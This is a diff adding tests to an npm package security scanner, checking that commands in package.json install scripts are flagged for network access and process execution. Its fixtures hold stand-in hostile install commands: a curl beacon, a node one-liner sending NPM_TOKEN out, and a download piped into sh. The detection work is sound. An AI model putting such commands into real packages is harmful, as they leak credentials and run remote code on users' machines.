@@ -347,3 +347,50 @@ describe('capability rules against shapes found in real packages', () => {
     assert.equal(scanPackageDir(dir).capabilities.nativeFfi.present, true);
   });
 });
+
+// A lifecycle script's command runs on install but lives in package.json, so
+// the directory walk never reaches it. Found by scanning 5,761 published
+// packages: the one package in that corpus that beacons out on install,
+// xhjxhjtestrce123, ran `curl http://<host>/?host=...` from both preinstall
+// and postinstall and its manifest recorded no network capability at all.
+describe('lifecycle script commands', () => {
+  function pkg(scripts, files = { 'index.js': 'module.exports = {};\n' }) {
+    const tmp = mkTmpDir('script-cmd');
+    return scanPackageDir(writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0', scripts }, files));
+  }
+
+  test('a curl in an install script is network access, and the URL is recorded', () => {
+    const m = pkg({ preinstall: 'curl http://beacon.invalid/?host=x' });
+    assert.equal(m.capabilities.network.present, true);
+    assert.deepEqual(m.capabilities.network.endpoints, ['http://beacon.invalid/?host=x']);
+  });
+
+  test('inline JavaScript in node -e is scanned by the JavaScript rules', () => {
+    const m = pkg({ postinstall: 'node -e "require(\'https\').get(process.env.NPM_TOKEN)"' });
+    assert.equal(m.capabilities.network.present, true);
+    assert.equal(m.capabilities.sensitiveTargets.present, true);
+    assert.ok(m.riskFlags.some((f) => f.startsWith('CRITICAL')));
+  });
+
+  test('piping a download into a shell is both network and process execution', () => {
+    const m = pkg({ postinstall: 'curl -sL https://x.invalid/i.sh | sh' });
+    assert.equal(m.capabilities.network.present, true);
+    assert.equal(m.capabilities.exec.present, true);
+  });
+
+  test('an ordinary build command grants nothing extra', () => {
+    const m = pkg({ postinstall: 'node scripts/build.js' });
+    assert.equal(m.capabilities.network.present, false);
+    assert.equal(m.capabilities.exec.present, false);
+    assert.equal(m.capabilities.dynamicEval.present, false);
+  });
+
+  test('a non-string scripts entry does not throw', () => {
+    const tmp = mkTmpDir('script-bad');
+    const dir = writePackage(tmp, 'pkg', { name: 'pkg', version: '1.0.0', scripts: { postinstall: { nested: true } } }, {
+      'index.js': 'module.exports = {};\n',
+    });
+    const m = scanPackageDir(dir);
+    assert.equal(m.capabilities.lifecycleScripts.installTriggering, false);
+  });
+});
